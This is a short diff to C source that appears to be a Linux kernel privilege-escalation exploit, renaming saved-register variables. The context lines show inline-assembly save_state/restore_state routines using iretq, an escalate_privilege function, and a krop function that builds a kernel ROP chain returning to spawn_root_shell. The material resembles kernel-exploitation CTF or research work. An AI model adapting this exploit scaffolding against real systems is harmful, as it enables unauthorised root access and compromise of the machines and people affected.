@@ -27,18 +27,18 @@ void save_state(void) {
         "pushfq;"
         "pop %3;"
         ".att_syntax;"
-        : "=r"(user_cs), "=r"(user_ss), "=r"(user_rsp), "=r"(user_rflags)
+        : "=r"(user_cs), "=r"(user_ss), "=r"(user_sp), "=r"(user_flags)
         :
         : "memory");
     printf("      user_cs     = 0x%016lx\n", user_cs);
-    printf("      user_rflags = 0x%016lx\n", user_rflags);
-    printf("      user_rsp    = 0x%016lx\n", user_rsp);
+    printf("      user_flags = 0x%016lx\n", user_flags);
+    printf("      user_sp    = 0x%016lx\n", user_sp);
     printf("      user_ss     = 0x%016lx\n", user_ss);
 }
 
 void restore_state(void) {
     puts("[+] restoring state");
-    if (user_rsp == 0) {
+    if (user_sp == 0) {
         puts("[-] please call save_state in advance");
         exit(EXIT_FAILURE);
     }
@@ -53,7 +53,7 @@ void restore_state(void) {
         "iretq;"
         ".att_syntax;"
         :
-        : "r"(user_ss), "r"(user_rsp), "r"(user_rflags), "r"(user_cs), "r"(spawn_root_shell));
+        : "r"(user_ss), "r"(user_sp), "r"(user_flags), "r"(user_cs), "r"(spawn_root_shell));
 }
 
 void escalate_privilege(void) {
@@ -71,7 +71,7 @@ void krop(u64 *ptr) {
     *ptr++ = 0xcafebabe;
     *ptr++ = (u64)spawn_root_shell;
     *ptr++ = user_cs;
-    *ptr++ = user_rflags;
-    *ptr++ = user_rsp;
+    *ptr++ = user_flags;
+    *ptr++ = user_sp;
     *ptr++ = user_ss;
 }
